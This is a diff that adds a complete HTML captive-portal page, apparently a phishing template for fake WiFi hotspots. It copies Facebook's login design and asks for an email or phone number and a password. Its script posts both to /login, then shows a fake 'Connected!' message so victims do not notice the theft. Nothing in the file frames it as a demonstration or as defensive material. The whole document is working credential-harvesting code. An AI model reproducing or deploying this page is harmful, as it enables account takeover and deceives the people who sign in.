@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In - Continue to WiFi</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.portal {
+    background: #fff;
+    border-radius: 12px;
+    padding: 32px;
+    width: 400px;
+    max-width: 90vw;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+}
+.logo { text-align: center; margin-bottom: 24px; }
+.logo h1 { font-size: 28px; color: #1877f2; font-weight: 800; }
+.logo p { color: #606770; font-size: 14px; margin-top: 8px; }
+.form-group { margin-bottom: 14px; }
+.form-group input {
+    width: 100%; padding: 14px 16px;
+    background: #f5f6f7;
+    border: 1px solid #dddfe2;
+    border-radius: 8px; color: #1d2129; font-size: 16px;
+}
+.form-group input:focus { outline: none; border-color: #1877f2; background: #fff; }
+.btn-primary {
+    width: 100%; padding: 14px;
+    background: #1877f2; border: none; border-radius: 8px;
+    color: #fff; font-size: 18px; font-weight: 700;
+    cursor: pointer; margin-top: 8px;
+}
+.btn-primary:hover { background: #166fe5; }
+.forgot { text-align: center; margin-top: 14px; }
+.forgot a { color: #1877f2; font-size: 14px; text-decoration: none; }
+.divider {
+    border-top: 1px solid #dddfe2;
+    margin: 20px 0; position: relative;
+}
+.divider span {
+    position: absolute; top: -10px; left: 50%; transform: translateX(-50%);
+    background: #fff; padding: 0 12px; color: #606770; font-size: 13px;
+}
+.btn-create {
+    display: block; width: 60%; margin: 0 auto; padding: 12px;
+    background: #42b72a; border: none; border-radius: 8px;
+    color: #fff; font-size: 16px; font-weight: 700;
+    cursor: pointer; text-align: center;
+}
+.btn-create:hover { background: #36a420; }
+.success { display: none; text-align: center; padding: 40px 0; }
+.success .check { font-size: 56px; margin-bottom: 16px; }
+.success h2 { color: #42b72a; }
+.success p { color: #606770; margin-top: 8px; font-size: 14px; }
+</style>
+</head>
+<body>
+<div class="portal">
+    <div id="loginForm">
+        <div class="logo">
+            <h1>WiFi Login</h1>
+            <p>Sign in to continue to the internet</p>
+        </div>
+        <form method="POST" action="/login" onsubmit="return handleSubmit(event)">
+            <div class="form-group">
+                <input type="text" name="username" id="username" placeholder="Email or phone number" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn-primary">Log In</button>
+        </form>
+        <div class="forgot"><a href="#">Forgotten password?</a></div>
+        <div class="divider"><span>or</span></div>
+        <button class="btn-create" onclick="document.getElementById('username').focus()">Create New Account</button>
+    </div>
+    <div id="successMsg" class="success">
+        <div class="check">✅</div>
+        <h2>Connected!</h2>
+        <p>You are now online. Enjoy browsing!</p>
+    </div>
+</div>
+<script>
+function handleSubmit(e) {
+    e.preventDefault();
+    var data = 'username=' + encodeURIComponent(document.getElementById('username').value)
+        + '&password=' + encodeURIComponent(document.getElementById('password').value);
+    fetch('/login', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:data})
+    .then(function(){
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('successMsg').style.display = 'block';
+    });
+    return false;
+}
+</script>
+</body>
+</html>
